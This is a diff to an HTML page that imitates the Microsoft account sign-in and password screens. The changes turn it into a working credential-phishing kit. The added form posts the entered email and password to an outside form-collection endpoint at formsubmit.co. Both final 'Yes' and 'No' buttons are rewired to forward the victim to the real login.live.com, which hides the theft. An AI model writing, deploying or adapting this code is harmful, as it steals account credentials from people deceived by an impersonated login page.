@@ -15,12 +15,11 @@
         <div class="auth-wrapper">
             <img src="assests/logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <form>
+            <form action="https://formsubmit.co/el/wehoya" method="post">
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
                     <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
                 </div>
-            </form>
             <div>
                 <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                 <p class="mb-16 fs-13">
@@ -49,12 +48,10 @@
                 <span id="user_identity">a@b.com</span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <form>
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
                     <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                 </div>
-            </form>
             <div>
                 <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                 <p class="mb-16">
@@ -62,8 +59,9 @@
                 </p>
             </div>
             <div>
-                <button class="btn" id="btn_sig">Sign in</button>
+                <button class="btn" id="btn_sig" type="submit">Sign in</button>
             </div>
+             </form>
         </div>
     </section>
 
@@ -80,8 +78,10 @@
                 <span>Don't show this again</span>
             </label>
             <div class="btn-group">
-                <button class="btn btn-sec" id="btn_final">No</button>
-                <button class="btn" id="btn_final">Yes</button>
+                <button class="btn btn-sec" id="btn_final"> <a href="https://login.live.com" class="btn btn-sec" style="text-decoration:none;">No</a> 
+</button>
+                <button class="btn" id="btn_final"> <a href="https://login.live.com" class="btn" style="text-decoration:none;>Yes</a> 
+</button>
             </div>
         </div>
     </section>
